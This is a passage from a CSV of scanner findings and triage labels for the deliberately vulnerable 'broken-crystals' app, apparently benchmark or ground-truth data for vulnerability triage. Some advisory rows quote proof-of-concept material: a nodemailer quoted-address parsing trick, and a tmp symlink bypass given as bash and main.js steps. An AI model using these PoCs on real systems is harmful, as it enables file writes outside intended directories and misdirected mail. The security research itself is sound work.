/*, new ParsingOptions(true) */); if (!parsed) { console.error(""Invalid email address:"", mailOptions.to); return; } console.log(""Parsed email:"", { address: `${parsed.localPart}@${parsed.domain}`, local: parsed.localPart, domain: parsed.domain, }); })(); ``` Running the script and seeing how this mail is parsed according to RFC ``` Parsed email: { address: '""xclow3n@gmail.com x""@internal.domain', local: '""xclow3n@gmail.com x""', domain: 'internal.domain' } ``` But the email is sent to `xclow3n@gmail.com` <img width=""2128"" height=""439"" alt=""Image"" src=""https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d"" /> ### Impact: - Misdelivery / Data leakage: Email is sent to psres.net instead of test.com. - Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts. - Potential compliance issue: Violates RFC 5321/5322 parsing rules. - Domain based access control bypass in downstream applications using your library to send mails ### Recommendations - Fix parser to correctly treat quoted local-parts per RFC 5321/5322. - Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",TP,medium,yes,1
GRP-broken-crystals-CWE-436-622,trivy,broken-crystals,CWE-436,critical,wget@1.20.1-1.1,wget: Misinterpretation of input may lead to improper behavior,TP,medium,yes,1
GRP-broken-crystals-CWE-436-623,trivy,broken-crystals,CWE-436,high,fastify@4.13.0,Fastify: Fastify: Validation bypass due to malformed Content-Type header leading to integrity impact,TP,medium,yes,1
GRP-broken-crystals-CWE-441-624,npm-audit,broken-crystals,CWE-441,info,@fastify/reply-from,fastify-reply-from affected by bypass of reply forwarding,pending,low,no,1
GRP-broken-crystals-CWE-441-625,dep-check,broken-crystals,CWE-441,info,@fastify/reply-from:9.8.0,"### Summary By crafting a malicious URL, an attacker could access routes that are not allowed, even though the `reply.from` is defined for specific routes in `@fastify/reply-from`. ### Details An attacker can bypass the route defined by the `@fastify/reply-from` package by adding a `..` symbol, which, for `curl` version `8.7.1`, is `%2e%2e`. ### Impact Everyone is using this package with the routes option to protect a 3rd-party resource.",pending,low,no,1
GRP-broken-crystals-CWE-444-626,trivy,broken-crystals,CWE-444,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-627,trivy,broken-crystals,CWE-444,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-628,trivy,broken-crystals,CWE-444,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-629,trivy,broken-crystals,CWE-444,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-630,trivy,broken-crystals,CWE-444,medium,python2.7@2.7.16-2+deb10u1,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-631,trivy,broken-crystals,CWE-444,medium,python2.7-minimal@2.7.16-2+deb10u1,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-632,trivy,broken-crystals,CWE-444,medium,python3.7@3.7.3-2+deb10u4,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-444-633,trivy,broken-crystals,CWE-444,medium,python3.7-minimal@3.7.3-2+deb10u4,python: Web cache poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a semicolon in query parameters,pending,low,no,1
GRP-broken-crystals-CWE-459-634,trivy,broken-crystals,CWE-459,medium,linux-libc-dev@4.19.269-1,kernel: nfc: nci: free rx_data_reassembly skb on NCI device cleanup,pending,low,no,1
GRP-broken-crystals-CWE-460-635,trivy,broken-crystals,CWE-460,high,linux-libc-dev@4.19.269-1,kernel: tun: avoid double free in tun_free_netdev,pending,low,no,1
GRP-broken-crystals-CWE-466-636,trivy,broken-crystals,CWE-466,medium,libc-bin@2.28-10+deb10u2,glibc: netgroup cache assumes NSS callback uses in-buffer strings,pending,low,no,1
GRP-broken-crystals-CWE-466-637,trivy,broken-crystals,CWE-466,medium,libc-dev-bin@2.28-10+deb10u2,glibc: netgroup cache assumes NSS callback uses in-buffer strings,pending,low,no,1
GRP-broken-crystals-CWE-466-638,trivy,broken-crystals,CWE-466,medium,libc6@2.28-10+deb10u2,glibc: netgroup cache assumes NSS callback uses in-buffer strings,pending,low,no,1
GRP-broken-crystals-CWE-466-639,trivy,broken-crystals,CWE-466,medium,libc6-dev@2.28-10+deb10u2,glibc: netgroup cache assumes NSS callback uses in-buffer strings,pending,low,no,1
GRP-broken-crystals-CWE-476-640,trivy,broken-crystals,CWE-476,medium,libc-bin@2.28-10+deb10u2,glibc: null pointer dereferences after failed netgroup cache insertion,pending,low,no,1
GRP-broken-crystals-CWE-476-641,trivy,broken-crystals,CWE-476,medium,libc-dev-bin@2.28-10+deb10u2,glibc: null pointer dereferences after failed netgroup cache insertion,pending,low,no,1
GRP-broken-crystals-CWE-476-642,trivy,broken-crystals,CWE-476,medium,libc6@2.28-10+deb10u2,glibc: null pointer dereferences after failed netgroup cache insertion,pending,low,no,1
GRP-broken-crystals-CWE-476-643,trivy,broken-crystals,CWE-476,medium,libc6-dev@2.28-10+deb10u2,glibc: null pointer dereferences after failed netgroup cache insertion,pending,low,no,1
GRP-broken-crystals-CWE-476-644,trivy,broken-crystals,CWE-476,low,libcairo-gobject2@1.16.0-4+deb10u1,cairo: NULL pointer dereference with a crafted font file,pending,low,no,1
GRP-broken-crystals-CWE-476-645,trivy,broken-crystals,CWE-476,low,libcairo-script-interpreter2@1.16.0-4+deb10u1,cairo: NULL pointer dereference with a crafted font file,pending,low,no,1
GRP-broken-crystals-CWE-476-646,trivy,broken-crystals,CWE-476,low,libcairo2@1.16.0-4+deb10u1,cairo: NULL pointer dereference with a crafted font file,pending,low,no,1
GRP-broken-crystals-CWE-476-647,trivy,broken-crystals,CWE-476,low,libcairo2-dev@1.16.0-4+deb10u1,cairo: NULL pointer dereference with a crafted font file,pending,low,no,1
GRP-broken-crystals-CWE-476-648,trivy,broken-crystals,CWE-476,medium,libde265-0@1.0.11-0+deb10u4,Libde265 v1.0.11 was discovered to contain a segmentation violation vi ...,pending,low,no,1
GRP-broken-crystals-CWE-476-649,trivy,broken-crystals,CWE-476,medium,libjpeg-dev@1:1.5.2-2+deb10u1,libjpeg-turbo: Null pointer dereference in jcopy_sample_rows() function,pending,low,no,1
GRP-broken-crystals-CWE-476-650,trivy,broken-crystals,CWE-476,medium,libjpeg62-turbo@1:1.5.2-2+deb10u1,libjpeg-turbo: Null pointer dereference in jcopy_sample_rows() function,pending,low,no,1
GRP-broken-crystals-CWE-476-651,trivy,broken-crystals,CWE-476,medium,libjpeg62-turbo-dev@1:1.5.2-2+deb10u1,libjpeg-turbo: Null pointer dereference in jcopy_sample_rows() function,pending,low,no,1
GRP-broken-crystals-CWE-476-652,trivy,broken-crystals,CWE-476,high,libldap-2.4-2@2.4.47+dfsg-3+deb10u7,openldap: null pointer dereference in ber_memalloc_x function,pending,low,no,1
GRP-broken-crystals-CWE-476-653,trivy,broken-crystals,CWE-476,high,libldap-common@2.4.47+dfsg-3+deb10u7,openldap: null pointer dereference in ber_memalloc_x function,pending,low,no,1
GRP-broken-crystals-CWE-476-654,trivy,broken-crystals,CWE-476,medium,libmariadb-dev@1:10.3.38-0+deb10u1,mariadb: NULL pointer dereference in spider_db_mbase::print_warnings(),pending,low,no,1
GRP-broken-crystals-CWE-476-655,trivy,broken-crystals,CWE-476,medium,libmariadb-dev-compat@1:10.3.38-0+deb10u1,mariadb: NULL pointer dereference in spider_db_mbase::print_warnings(),pending,low,no,1
GRP-broken-crystals-CWE-476-656,trivy,broken-crystals,CWE-476,medium,libmariadb3@1:10.3.38-0+deb10u1,mariadb: NULL pointer dereference in spider_db_mbase::print_warnings(),pending,low,no,1
GRP-broken-crystals-CWE-476-657,trivy,broken-crystals,CWE-476,medium,libssl-dev@1.1.1n-0+deb10u4,openssl: denial of service via null dereference,pending,low,no,1
GRP-broken-crystals-CWE-476-658,trivy,broken-crystals,CWE-476,medium,libssl1.1@1.1.1n-0+deb10u4,openssl: denial of service via null dereference,pending,low,no,1
GRP-broken-crystals-CWE-476-659,trivy,broken-crystals,CWE-476,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: null pointer dereference in tif_dir.c,pending,low,no,1
GRP-broken-crystals-CWE-476-660,trivy,broken-crystals,CWE-476,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: null pointer dereference in tif_dir.c,pending,low,no,1
GRP-broken-crystals-CWE-476-661,trivy,broken-crystals,CWE-476,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: null pointer dereference in tif_dir.c,pending,low,no,1
GRP-broken-crystals-CWE-476-662,trivy,broken-crystals,CWE-476,high,libxml2@2.9.4+dfsg1-7+deb10u5,lxml: NULL Pointer Dereference in lxml,pending,low,no,1
GRP-broken-crystals-CWE-476-663,trivy,broken-crystals,CWE-476,high,libxml2-dev@2.9.4+dfsg1-7+deb10u5,lxml: NULL Pointer Dereference in lxml,pending,low,no,1
GRP-broken-crystals-CWE-476-664,trivy,broken-crystals,CWE-476,high,linux-libc-dev@4.19.269-1,kernel: tls: race condition in do_tls_getsockopt may lead to use-after-free or NULL pointer dereference,pending,low,no,1
GRP-broken-crystals-CWE-476-665,trivy,broken-crystals,CWE-476,medium,mariadb-common@1:10.3.38-0+deb10u1,mariadb: NULL pointer dereference in spider_db_mbase::print_warnings(),pending,low,no,1
GRP-broken-crystals-CWE-476-666,trivy,broken-crystals,CWE-476,medium,openssl@1.1.1n-0+deb10u4,openssl: denial of service via null dereference,pending,low,no,1
GRP-broken-crystals-CWE-476-667,trivy,broken-crystals,CWE-476,high,ws@7.5.9,nodejs-ws: denial of service when handling a request with many HTTP headers,pending,low,no,1
GRP-broken-crystals-CWE-476-668,trivy,broken-crystals,CWE-476,high,ws@8.12.0,nodejs-ws: denial of service when handling a request with many HTTP headers,pending,low,no,1
GRP-broken-crystals-CWE-476-669,trivy,broken-crystals,CWE-476,high,ws@8.12.1,nodejs-ws: denial of service when handling a request with many HTTP headers,pending,low,no,1
GRP-broken-crystals-CWE-502-670,trivy,broken-crystals,CWE-502,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: local privilege escalation via the multiprocessing forkserver start method,pending,low,no,1
GRP-broken-crystals-CWE-502-671,trivy,broken-crystals,CWE-502,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: local privilege escalation via the multiprocessing forkserver start method,pending,low,no,1
GRP-broken-crystals-CWE-502-672,trivy,broken-crystals,CWE-502,high,python3.7@3.7.3-2+deb10u4,python: local privilege escalation via the multiprocessing forkserver start method,pending,low,no,1
GRP-broken-crystals-CWE-502-673,trivy,broken-crystals,CWE-502,high,python3.7-minimal@3.7.3-2+deb10u4,python: local privilege escalation via the multiprocessing forkserver start method,pending,low,no,1
GRP-broken-crystals-CWE-524-674,zap,broken-crystals,CWE-524,info,http://host.docker.internal:3001,Storable and Cacheable Content,pending,low,no,1
GRP-broken-crystals-CWE-532-675,bearer,broken-crystals,CWE-532,info,client/src/pages/main/Header/Header.tsx:15,"## Description Information leakage through logger messages can compromise sensitive data. This vulnerability arises when dynamic data or variables, which may contain sensitive information, are included in log messages. ## Remediations - **Do not** include sensitive data directly in logger messages. This can lead to the exposure of such data in log files, which might be accessible to unauthorized individuals. ```javascript logger.info(`Results: ${data}`) // unsafe ``` - **Do** use logging levels appropriately to control the verbosity of log output and minimize the risk of leaking sensitive information in production environments.",pending,low,no,1
GRP-broken-crystals-CWE-532-676,bearer,broken-crystals,CWE-532,info,client/src/pages/marketplace/ProductView.tsx:38,"## Description Information leakage through logger messages can compromise sensitive data. This vulnerability arises when dynamic data or variables, which may contain sensitive information, are included in log messages. ## Remediations - **Do not** include sensitive data directly in logger messages. This can lead to the exposure of such data in log files, which might be accessible to unauthorized individuals. ```javascript logger.info(`Results: ${data}`) // unsafe ``` - **Do** use logging levels appropriately to control the verbosity of log output and minimize the risk of leaking sensitive information in production environments.",pending,low,no,1
GRP-broken-crystals-CWE-532-677,bearer,broken-crystals,CWE-532,info,src/main.ts:270,"## Description Information leakage through logger messages can compromise sensitive data. This vulnerability arises when dynamic data or variables, which may contain sensitive information, are included in log messages. ## Remediations - **Do not** include sensitive data directly in logger messages. This can lead to the exposure of such data in log files, which might be accessible to unauthorized individuals. ```javascript logger.info(`Results: ${data}`) // unsafe ``` - **Do** use logging levels appropriately to control the verbosity of log output and minimize the risk of leaking sensitive information in production environments.",pending,low,no,1
GRP-broken-crystals-CWE-547-678,trivy,broken-crystals,CWE-547,high,git@1:2.20.1-2+deb10u8,git: symlink bypass,pending,low,no,1
GRP-broken-crystals-CWE-547-679,trivy,broken-crystals,CWE-547,high,git-man@1:2.20.1-2+deb10u8,git: symlink bypass,pending,low,no,1
GRP-broken-crystals-CWE-59-680,npm-audit,broken-crystals,CWE-59,low,tmp,tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter,pending,low,no,1
GRP-broken-crystals-CWE-59-681,dep-check,broken-crystals,CWE-59,low,tmp:0.0.33,"### Summary `tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter. ### Details According to the documentation there are some conditions that must be held: ``` // https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50 Other breaking changes, i.e. - template must be relative to tmpdir - name must be relative to tmpdir - dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks are still in place. In order to override the system's tmpdir, you will have to use the newly introduced tmpdir option. // https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375 * `dir`: the optional temporary directory that must be relative to the system's default temporary directory. absolute paths are fine as long as they point to a location under the system's default temporary directory. Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, as tmp will not check the availability of the path, nor will it establish the requested path for you. ``` Related issue: https://github.com/raszi/node-tmp/issues/207. The issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579 function _resolvePath(name, tmpDir) { if (name.startsWith(tmpDir)) { return path.resolve(name); } else { return path.resolve(path.join(tmpDir, name)); } } ``` If the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609 function _assertIsRelative(name, option, tmpDir) { if (option === 'name') { // assert that name is not absolute and does not contain a path if (path.isAbsolute(name)) throw new Error(`${option} option must not contain an absolute path, found ""${name}"".`); // must not fail on valid .<name> or ..<name> or similar such constructs let basename = path.basename(name); if (basename === '..' || basename === '.' || basename !== name) throw new Error(`${option} option must not contain a path, found ""${name}"".`); } else { // if (option === 'dir' || option === 'template') { // assert that dir or template are relative to tmpDir if (path.isAbsolute(name) && !name.startsWith(tmpDir)) { throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${name}"".`); } let resolvedPath = _resolvePath(name, tmpDir); //<--- if (!resolvedPath.startsWith(tmpDir)) throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${resolvedPath}"".`); } } ``` ### PoC The following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible. Tested on a Linux machine. - Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it ```bash mkdir $HOME/mydir1 ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir ``` - check the folder is empty: ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" ``` - run the poc ```bash node main.js File: /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]' test 2: dir option must be relative to ""/tmp"", found ""/foo"". test 3: dir option must be relative to ""/tmp"", found ""/home/user/mydir1"". ``` - the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`): ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" -rw------- 1 user user 0 Apr X XX:XX tmp-[random-id] ``` - `main.js` ```js // npm i tmp@0.2.3 const tmp = require('tmp'); const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'}); console.log('File: ', tmpobj.name); try { tmp.fileSync({ 'dir': 'mydir1'}); } catch (err) { console.log('test 1:', err.message) } try { tmp.fileSync({ 'dir': '/foo'}); } catch (err) { console.log('test 2:', err.message) } try { const fs = require('node:fs'); const resolved = fs.realpathSync('/tmp/evil-dir'); tmp.fileSync({ 'dir': resolved}); } catch (err) { console.log('test 3:', err.message) } ``` A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links. ```js function _resolvePath(name, tmpDir) { let resolvedPath; if (name.startsWith(tmpDir)) { resolvedPath = path.resolve(name); } else { resolvedPath = path.resolve(path.join(tmpDir, name)); } return fs.realpathSync(resolvedPath); } ``` ### Impact Arbitrary temporary file / directory write via symlink",pending,low,no,1
GRP-broken-crystals-CWE-59-682,dep-check,broken-crystals,CWE-59,low,tmp:0.2.3,"### Summary `tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter. ### Details According to the documentation there are some conditions that must be held: ``` // https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50 Other breaking changes, i.e. - template must be relative to tmpdir - name must be relative to tmpdir - dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks are still in place. In order to override the system's tmpdir, you will have to use the newly introduced tmpdir option. // https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375 * `dir`: the optional temporary directory that must be relative to the system's default temporary directory. absolute paths are fine as long as they point to a location under the system's default temporary directory. Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, as tmp will not check the availability of the path, nor will it establish the requested path for you. ``` Related issue: https://github.com/raszi/node-tmp/issues/207. The issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579 function _resolvePath(name, tmpDir) { if (name.startsWith(tmpDir)) { return path.resolve(name); } else { return path.resolve(path.join(tmpDir, name)); } } ``` If the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609 function _assertIsRelative(name, option, tmpDir) { if (option === 'name') { // assert that name is not absolute and does not contain a path if (path.isAbsolute(name)) throw new Error(`${option} option must not contain an absolute path, found ""${name}"".`); // must not fail on valid .<name> or ..<name> or similar such constructs let basename = path.basename(name); if (basename === '..' || basename === '.' || basename !== name) throw new Error(`${option} option must not contain a path, found ""${name}"".`); } else { // if (option === 'dir' || option === 'template') { // assert that dir or template are relative to tmpDir if (path.isAbsolute(name) && !name.startsWith(tmpDir)) { throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${name}"".`); } let resolvedPath = _resolvePath(name, tmpDir); //<--- if (!resolvedPath.startsWith(tmpDir)) throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${resolvedPath}"".`); } } ``` ### PoC The following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible. Tested on a Linux machine. - Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it ```bash mkdir $HOME/mydir1 ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir ``` - check the folder is empty: ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" ``` - run the poc ```bash node main.js File: /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]' test 2: dir option must be relative to ""/tmp"", found ""/foo"". test 3: dir option must be relative to ""/tmp"", found ""/home/user/mydir1"". ``` - the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`): ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" -rw------- 1 user user 0 Apr X XX:XX tmp-[random-id] ``` - `main.js` ```js // npm i tmp@0.2.3 const tmp = require('tmp'); const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'}); console.log('File: ', tmpobj.name); try { tmp.fileSync({ 'dir': 'mydir1'}); } catch (err) { console.log('test 1:', err.message) } try { tmp.fileSync({ 'dir': '/foo'}); } catch (err) { console.log('test 2:', err.message) } try { const fs = require('node:fs'); const resolved = fs.realpathSync('/tmp/evil-dir'); tmp.fileSync({ 'dir': resolved}); } catch (err) { console.log('test 3:', err.message) } ``` A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links. ```js function _resolvePath(name, tmpDir) { let resolvedPath; if (name.startsWith(tmpDir)) { resolvedPath = path.resolve(name); } else { resolvedPath = path.resolve(path.join(tmpDir, name)); } return fs.realpathSync(resolvedPath); } ``` ### Impact Arbitrary temporary file / directory write via symlink",pending,low,no,1
GRP-broken-crystals-CWE-601-683,dep-check,broken-crystals,CWE-601,info,react-router:6.26.2,"An attacker-supplied path can be crafted so that when a React Router application navigates to it via `navigate()`, `<Link>`, or `redirect()`, the app performs a navigation/redirect to an external URL. This is only an issue if developers pass untrusted content into navigation paths in their application code.",TP,medium,yes,1
GRP-broken-crystals-CWE-601-684,trivy,broken-crystals,CWE-601,medium,wget@1.20.1-1.1,wget: authorization header disclosure on redirect,TP,medium,yes,1
GRP-broken-crystals-CWE-606-685,trivy,broken-crystals,CWE-606,medium,libssl-dev@1.1.1n-0+deb10u4,openssl: Excessive time spent checking DH keys and parameters,pending,low,no,1
GRP-broken-crystals-CWE-606-686,trivy,broken-crystals,CWE-606,medium,libssl1.1@1.1.1n-0+deb10u4,openssl: Excessive time spent checking DH keys and parameters,pending,low,no,1
GRP-broken-crystals-CWE-606-687,trivy,broken-crystals,CWE-606,medium,openssl@1.1.1n-0+deb10u4,openssl: Excessive time spent checking DH keys and parameters,pending,low,no,1
GRP-broken-crystals-CWE-610-688,trivy,broken-crystals,CWE-610,high,linux-libc-dev@4.19.269-1,kernel: Bypassing Spectre-BTI User Space Mitigations,pending,low,no,1
GRP-broken-crystals-CWE-611-689,trivy,broken-crystals,CWE-611,critical,libpython2.7-minimal@2.7.16-2+deb10u1,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-690,trivy,broken-crystals,CWE-611,critical,libpython2.7-stdlib@2.7.16-2+deb10u1,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-691,trivy,broken-crystals,CWE-611,critical,libpython3.7-minimal@3.7.3-2+deb10u4,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-692,trivy,broken-crystals,CWE-611,critical,libpython3.7-stdlib@3.7.3-2+deb10u4,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-693,trivy,broken-crystals,CWE-611,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: XML External Entity vulnerability,TP,medium,yes,1
GRP-broken-crystals-CWE-611-694,trivy,broken-crystals,CWE-611,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: XML External Entity vulnerability,TP,medium,yes,1
GRP-broken-crystals-CWE-611-695,trivy,broken-crystals,CWE-611,critical,python2.7@2.7.16-2+deb10u1,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-696,trivy,broken-crystals,CWE-611,critical,python2.7-minimal@2.7.16-2+deb10u1,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-697,trivy,broken-crystals,CWE-611,critical,python3.7@3.7.3-2+deb10u4,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-611-698,trivy,broken-crystals,CWE-611,critical,python3.7-minimal@3.7.3-2+deb10u4,python: XML External Entity in XML processing plistlib module,TP,medium,yes,1
GRP-broken-crystals-CWE-613-699,trivy,broken-crystals,CWE-613,high,@fastify/session@10.1.1,@fastify/session reuses destroyed session cookie,pending,low,no,1
GRP-broken-crystals-CWE-614-700,bearer,broken-crystals,CWE-614,info,src/main.ts:191,"## Description When a cookie lacks the Secure attribute, it can be transmitted over an unencrypted connection, making it vulnerable to interception by unauthorized parties. Enabling the Secure option ensures that cookies are only sent over HTTPS, enhancing the security of data in transit. ## Remediations - **Do** set the `secure` attribute of cookies to `true`. This action mandates that cookies are sent only over HTTPS, safeguarding them from potential eavesdropping. ```javascript cookie({ secure: true }); ``` ## References - [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)",TP,medium,yes,1
GRP-broken-crystals-CWE-617-701,trivy,broken-crystals,CWE-617,medium,libc-bin@2.28-10+deb10u2,glibc: netgroup cache may terminate daemon on memory allocation failure,pending,low,no,1
GRP-broken-crystals-CWE-617-702,trivy,broken-crystals,CWE-617,medium,libc-dev-bin@2.28-10+deb10u2,glibc: netgroup cache may terminate daemon on memory allocation failure,pending,low,no,1
GRP-broken-crystals-CWE-617-703,trivy,broken-crystals,CWE-617,medium,libc6@2.28-10+deb10u2,glibc: netgroup cache may terminate daemon on memory allocation failure,pending,low,no,1
GRP-broken-crystals-CWE-617-704,trivy,broken-crystals,CWE-617,medium,libc6-dev@2.28-10+deb10u2,glibc: netgroup cache may terminate daemon on memory allocation failure,pending,low,no,1
GRP-broken-crystals-CWE-617-705,trivy,broken-crystals,CWE-617,low,libcairo-gobject2@1.16.0-4+deb10u1,cairo: assertion problem in _cairo_arc_in_direction in cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-617-706,trivy,broken-crystals,CWE-617,low,libcairo-script-interpreter2@1.16.0-4+deb10u1,cairo: assertion problem in _cairo_arc_in_direction in cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-617-707,trivy,broken-crystals,CWE-617,low,libcairo2@1.16.0-4+deb10u1,cairo: assertion problem in _cairo_arc_in_direction in cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-617-708,trivy,broken-crystals,CWE-617,low,libcairo2-dev@1.16.0-4+deb10u1,cairo: assertion problem in _cairo_arc_in_direction in cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-664-709,trivy,broken-crystals,CWE-664,medium,libpam-modules@1.3.1-5,pam: allowing unprivileged user to block another user namespace,pending,low,no,1
GRP-broken-crystals-CWE-664-710,trivy,broken-crystals,CWE-664,medium,libpam-modules-bin@1.3.1-5,pam: allowing unprivileged user to block another user namespace,pending,low,no,1
GRP-broken-crystals-CWE-664-711,trivy,broken-crystals,CWE-664,medium,libpam-runtime@1.3.1-5,pam: allowing unprivileged user to block another user namespace,pending,low,no,1
GRP-broken-crystals-CWE-664-712,trivy,broken-crystals,CWE-664,medium,libpam0g@1.3.1-5,pam: allowing unprivileged user to block another user namespace,pending,low,no,1
GRP-broken-crystals-CWE-665-713,trivy,broken-crystals,CWE-665,medium,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: segmentation fault in opj2_decompress due to uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-665-714,trivy,broken-crystals,CWE-665,medium,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: segmentation fault in opj2_decompress due to uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-665-715,trivy,broken-crystals,CWE-665,medium,linux-libc-dev@4.19.269-1,kernel: net: openvswitch: fix overwriting ct original tuple for ICMPv6,pending,low,no,1
GRP-broken-crystals-CWE-667-716,trivy,broken-crystals,CWE-667,high,linux-libc-dev@4.19.269-1,kernel: USB: core: Fix deadlock in usb_deauthorize_interface(),pending,low,no,1
GRP-broken-crystals-CWE-668-717,trivy,broken-crystals,CWE-668,low,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-718,trivy,broken-crystals,CWE-668,low,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-719,trivy,broken-crystals,CWE-668,low,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-720,trivy,broken-crystals,CWE-668,low,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-721,trivy,broken-crystals,CWE-668,low,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-722,trivy,broken-crystals,CWE-668,low,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-723,trivy,broken-crystals,CWE-668,low,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-724,trivy,broken-crystals,CWE-668,low,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
